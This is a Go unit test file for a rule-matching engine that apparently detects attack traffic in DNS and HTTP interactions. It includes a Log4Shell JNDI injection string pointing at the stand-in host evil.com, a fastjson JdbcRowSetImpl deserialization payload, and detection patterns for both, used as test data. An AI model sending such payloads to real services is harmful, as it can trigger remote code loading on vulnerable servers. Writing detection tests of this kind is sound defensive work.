package executor

import (
	"testing"

	"github.com/chennqqi/godnslog/internal/models"
)

func TestMatchDomainRegex(t *testing.T) {
	e := NewEngine([]TemplateDef{
		{
			Name: "log4shell",
			Match: MatchRule{
				Type: "regex", Field: "domain",
				Pattern: `\$\{jndi:(ldap|rmi|dns)://`,
			},
			Severity: "critical",
		},
	})
	domain := "${jndi:ldap://evil.com/test}"
	inter := &models.Interaction{Type: "dns", Domain: &domain}
	results := e.Match(inter)
	if len(results) != 1 {
		t.Fatalf("expected 1 match, got %d", len(results))
	}
	if results[0].TemplateName != "log4shell" {
		t.Errorf("expected log4shell, got %q", results[0].TemplateName)
	}
}

func TestMatchBodyContains(t *testing.T) {
	e := NewEngine([]TemplateDef{
		{
			Name: "fastjson",
			Match: MatchRule{
				Type: "contains", Field: "body",
				Pattern: `{"@type":"`,
			},
			Severity: "critical",
		},
	})
	body := `{"@type":"com.sun.rowset.JdbcRowSetImpl"}`
	inter := &models.Interaction{Type: "http", Body: &body}
	results := e.Match(inter)
	if len(results) != 1 {
		t.Fatalf("expected 1 match, got %d", len(results))
	}
}

func TestMatchProtocolFilter(t *testing.T) {
	e := NewEngine([]TemplateDef{
		{
			Name:      "http-only",
			Protocols: []string{"http"},
			Match: MatchRule{
				Type: "contains", Field: "path", Pattern: "/test",
			},
			Severity: "medium",
		},
	})
	domain := "test.example.com"
	inter := &models.Interaction{Type: "dns", Domain: &domain}
	results := e.Match(inter)
	if len(results) != 0 {
		t.Errorf("expected 0 matches for protocol mismatch, got %d", len(results))
	}
}

func TestMatchNoTemplate(t *testing.T) {
	e := NewEngine(nil)
	domain := "test.example.com"
	inter := &models.Interaction{Type: "dns", Domain: &domain}
	results := e.Match(inter)
	if len(results) != 0 {
		t.Errorf("expected 0 matches with no templates, got %d", len(results))
	}
}

func TestMatchUnknownField(t *testing.T) {
	e := NewEngine([]TemplateDef{
		{
			Name: "test",
			Match: MatchRule{
				Type: "contains", Field: "nonexistent", Pattern: "x",
			},
		},
	})
	inter := &models.Interaction{Type: "dns"}
	results := e.Match(inter)
	if len(results) != 0 {
		t.Errorf("expected 0 matches for unknown field, got %d", len(results))
	}
}
